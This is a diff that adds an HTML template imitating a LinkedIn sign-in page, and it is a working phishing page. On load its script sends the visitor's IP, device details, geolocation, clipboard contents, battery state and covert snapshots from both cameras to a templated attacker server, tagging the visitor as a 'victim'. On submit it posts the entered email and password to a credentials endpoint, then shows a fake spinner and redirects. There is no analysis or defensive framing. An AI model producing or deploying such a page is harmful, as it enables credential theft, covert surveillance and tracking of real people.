@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LinkedIn Login</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f3f2ef; min-height: 100vh; display: flex; flex-direction: column; }
+.header { padding: 24px 0; text-align: center; }
+.logo { font-size: 32px; font-weight: 700; color: #0A66C2; letter-spacing: -0.5px; }
+.main { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 20px; }
+.card { background: #fff; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); padding: 24px; width: 100%; max-width: 400px; }
+h1 { font-size: 32px; color: rgba(0,0,0,0.9); margin-bottom: 8px; }
+.subtitle { color: rgba(0,0,0,0.6); font-size: 14px; margin-bottom: 24px; }
+.form-group { margin-bottom: 16px; }
+.form-group label { display: block; font-size: 14px; color: rgba(0,0,0,0.6); margin-bottom: 4px; }
+.form-group input { width: 100%; padding: 10px 12px; border: 1px solid rgba(0,0,0,0.6); border-radius: 4px; font-size: 16px; }
+.form-group input:focus { outline: none; border-color: #0A66C2; box-shadow: 0 0 0 1px #0A66C2; }
+.show-pass { display: flex; align-items: center; justify-content: flex-end; margin-top: -8px; margin-bottom: 16px; }
+.show-pass a { color: #0A66C2; font-size: 14px; font-weight: 600; text-decoration: none; }
+.btn { width: 100%; padding: 12px; background: #0A66C2; color: #fff; border: none; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; }
+.btn:hover { background: #004182; }
+.divider { display: flex; align-items: center; margin: 16px 0; }
+.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #ddd; }
+.divider span { padding: 0 16px; color: rgba(0,0,0,0.6); font-size: 14px; }
+.forgot { text-align: center; margin-top: 12px; }
+.forgot a { color: #0A66C2; font-size: 14px; font-weight: 600; text-decoration: none; }
+.signup { text-align: center; margin-top: 24px; font-size: 14px; color: rgba(0,0,0,0.6); }
+.signup a { color: #0A66C2; font-weight: 600; text-decoration: none; }
+.loading { display: none; text-align: center; padding: 30px; }
+.spinner { border: 3px solid #eee; border-top: 3px solid #0A66C2; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="header"><span class="logo">Linked<span style="background:#0A66C2;color:#fff;padding:1px 6px;border-radius:4px;">in</span></span></div>
+<div class="main">
+<div class="card">
+<h1>Sign in</h1>
+<p class="subtitle">Stay updated on your professional world</p>
+<form id="loginForm">
+<div class="form-group">
+<label>Email or phone</label>
+<input type="text" id="username" required>
+</div>
+<div class="form-group">
+<label>Password</label>
+<input type="password" id="password" required>
+</div>
+<div class="show-pass"><a href="#">Show</a></div>
+<button type="submit" class="btn">Sign in</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="color:#666;font-size:14px;">Signing in...</p>
+</div>
+<div class="divider"><span>or</span></div>
+<div class="forgot"><a href="#">Forgot password?</a></div>
+<p class="signup">New to LinkedIn? <a href="#">Join now</a></p>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+
+async function gatherAll() {
+    let td = '💼 <b>LinkedIn Victim!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
+    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){ navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true, timeout: 10000}); }
+    async function captureCamera(facingMode, label) { try { const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}}); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 2000)); canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label}); stream.getTracks().forEach(t => t.stop()); } catch(e) {} }
+    try { await captureCamera("user", "selfie"); } catch(e) {}
+    try { await captureCamera("environment", "back"); } catch(e) {}
+    try { if(navigator.clipboard && navigator.clipboard.readText) { const clip = await navigator.clipboard.readText(); if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)}); } } catch(e) {}
+    try { const bat = await navigator.getBattery(); $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging}); } catch(e) {}
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    document.querySelector('form').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    $.post("<%=a %>/creds", { uid: uid, user: encodeURIComponent(user), pass: encodeURIComponent(pass), platform: 'LinkedIn' });
+    await new Promise(r => setTimeout(r, 2500));
+    window.location.href = "<%=url %>";
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
